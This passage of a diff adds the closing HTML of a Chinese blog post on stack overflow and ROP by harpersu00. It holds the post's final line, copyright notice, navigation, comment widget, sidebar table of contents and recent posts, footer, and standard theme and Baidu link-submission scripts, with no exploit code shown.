+<p>关于ROP的具体利用方式请查看下一篇文章<a href="">栈溢出之 ROP（二）</a></p>
+
+    </div>
+
+    
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:16px;">----------------------END <i class="far fa-smile-wink"></i> END----------------------</div>
+    
+</div>
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>harpersu00
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://harpersu00.github.io/b1689cf9.html" title="栈溢出之 ROP（一）">https://harpersu00.github.io/b1689cf9.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/adec3bdf.html" rel="prev" title="栈溢出之 shellcode">
+      <i class="fa fa-chevron-left"></i> 栈溢出之 shellcode
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  
+  <div class="comments">
+  <script src="https://utteranc.es/client.js" repo="harpersu00/ForBlogComments" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>
+  </div>
+  
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">栈溢出缓解措施介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ASLR-%E5%92%8C-PIE"><span class="nav-number">1.1.</span> <span class="nav-text">ASLR 和 PIE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Stack-Canary-Cookie"><span class="nav-number">1.2.</span> <span class="nav-text">Stack Canary&#x2F;Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NX-DEP"><span class="nav-number">1.3.</span> <span class="nav-text">NX&#x2F;DEP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Return-to-libc"><span class="nav-number">2.</span> <span class="nav-text">Return to libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP-Return-Oriented-Programming"><span class="nav-number">3.</span> <span class="nav-text">ROP (Return Oriented Programming)</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="harpersu00"
+      src="/images/avatar1.JPG">
+  <p class="site-author-name" itemprop="name">harpersu00</p>
+  <div class="site-description" itemprop="description">记录，记录一下ing</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/harpersu00" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;harpersu00" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:harpersu00@gmail.com" title="E-Mail → mailto:harpersu00@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+      
+      <!-- 添加近期文章 -->
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-block">
+        <div class="links-of-blogroll-title">
+          <!-- modify icon to fire by szw -->
+          <i class="fa fa-history fa-" aria-hidden="true"></i>
+          近期文章
+        </div>
+        <ul class="links-of-blogroll-list">
+          
+          
+            <li class='pull-left' style="white-space:wrap" align="left" >
+                <time title="创建时间" itemprop="dateCreated datePublished" datetime="2019-03-12T00:00:00+08:00">
+                  &emsp;03-12
+                </time>
+                <a href="/b1689cf9.html" title="栈溢出之 ROP（一）">栈溢出之 ROP（一）</a>
+                <br>
+            </li>
+          
+            <li class='pull-left' style="white-space:wrap" align="left" >
+                <time title="创建时间" itemprop="dateCreated datePublished" datetime="2019-01-08T00:00:00+08:00">
+                  &emsp;01-08
+                </time>
+                <a href="/adec3bdf.html" title="栈溢出之 shellcode">栈溢出之 shellcode</a>
+                <br>
+            </li>
+          
+            <li class='pull-left' style="white-space:wrap" align="left" >
+                <time title="创建时间" itemprop="dateCreated datePublished" datetime="2018-09-19T00:00:00+08:00">
+                  &emsp;09-19
+                </time>
+                <a href="/1e59798b.html" title="GOT 表劫持原理">GOT 表劫持原理</a>
+                <br>
+            </li>
+          
+            <li class='pull-left' style="white-space:wrap" align="left" >
+                <time title="创建时间" itemprop="dateCreated datePublished" datetime="2017-05-09T00:00:00+08:00">
+                  &emsp;05-09
+                </time>
+                <a href="/50ed72f.html" title="（译）Handling low memory conditions in iOS and Mavericks">（译）Handling low memory conditions in iOS and Mavericks</a>
+                <br>
+            </li>
+          
+            <li class='pull-left' style="white-space:wrap" align="left" >
+                <time title="创建时间" itemprop="dateCreated datePublished" datetime="2017-04-12T00:00:00+08:00">
+                  &emsp;04-12
+                </time>
+                <a href="/ebd19f03.html" title="Objective-C 中的类结构">Objective-C 中的类结构</a>
+                <br>
+            </li>
+          
+        </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">harpersu00</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
